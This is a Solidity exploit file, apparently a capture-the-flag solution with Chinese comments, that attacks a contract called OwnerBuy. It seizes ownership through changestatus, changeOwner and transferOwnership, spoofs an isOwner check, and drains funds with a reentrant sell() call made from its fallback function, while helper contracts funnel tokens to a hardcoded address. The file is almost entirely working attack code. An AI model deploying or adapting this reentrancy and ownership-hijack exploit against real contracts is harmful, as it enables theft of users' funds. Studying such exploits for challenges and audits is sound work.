// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.13;

contract attacker {
    IOwnerBuy ownerbuy;
    bool isReentrancy = false;
    bool isCallIsOwner = false;

    function init(address _addr) public{
        ownerbuy = IOwnerBuy(_addr);
    }

    function beforeAttack() public {
        // 成为owner
        ownerbuy.changestatus(address(this));
        ownerbuy.changeOwner();
        // 修改_owner
        ownerbuy.transferOwnership(0x220866B1A2219f40e72f5c628B65D54268cA3A9D);

    }

    function Attack() public {
        // 获得100元
        ownerbuy.buy();
        // 用三个Helper合约转账给攻击合约
        // 攻击合约重入攻击
        ownerbuy.sell(200);
    }

    function isOwner(address _owner) public returns(bool){
        if(isCallIsOwner == false){
            return false;
        }
        return true;
    }

    fallback() external payable{
        if(isReentrancy == false){
            ownerbuy.sell(200);
            isReentrancy = true;
        }
    }
}

contract Helper{
    IOwnerBuy ownerbuy;
    
    constructor(address _addr) public {
        ownerbuy = IOwnerBuy(_addr);
    }
    function buyAndTransfer() public payable {
        ownerbuy.buy{value: 1 wei}();
        // 转给攻击合约地址，尚未填写
        ownerbuy.transfer(address(0xdb99f8e70f96625bdffdc8932d4c755baa0fffff),100);
    }
}

interface IOwnerBuy{
    function buy() external payable returns (bool);
    function sell(uint256) external returns (bool );
    function finish() external  returns (bool);
    function changeOwner() external;
    function changestatus(address) external;
    function transferOwnership(address) external;
    function transfer(address, uint256) external returns (bool);
}